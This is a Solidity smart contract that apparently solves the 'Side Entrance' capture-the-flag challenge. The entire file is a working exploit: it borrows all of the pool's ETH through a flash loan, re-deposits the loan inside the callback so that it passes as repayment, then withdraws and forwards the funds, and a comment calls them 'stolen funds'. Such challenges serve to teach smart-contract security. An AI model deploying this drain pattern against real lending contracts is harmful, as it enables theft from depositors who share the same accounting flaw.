// SPDX-License-Modifier: MIT
pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";


contract SideEntranceAttack {
    error SideEntranceAttack__Unauthorized();
    error SideEntranceAttack__FundsNotTransferred();

    SideEntranceLenderPool private immutable pool;
    address private immutable attacker;
    address private immutable recovery;

    constructor(address _pool, address _recovery) {
        pool = SideEntranceLenderPool(_pool);
        attacker = msg.sender;
        recovery = _recovery;
    }

    function execute() external payable {
        // Deposit the received loan back to the pool
        pool.deposit{value: msg.value}();
    }

    function attack() external {
        uint256 balanceBefore = address(this).balance;
        // Ensure only the deployer can can execute the attack
        if (msg.sender != attacker) {
            revert SideEntranceAttack__Unauthorized();
        }

        // Initiate the flash loan by taking all ETH in the pool
        pool.flashLoan(address(pool).balance);

        // Withdraw the funds from the pool
        pool.withdraw();

        if (address(this).balance <= balanceBefore) {
            revert SideEntranceAttack__FundsNotTransferred();
        }

        // Send all stolen funds to the attacker
        payable(recovery).transfer(address(this).balance);
    }

    receive() external payable {}
}
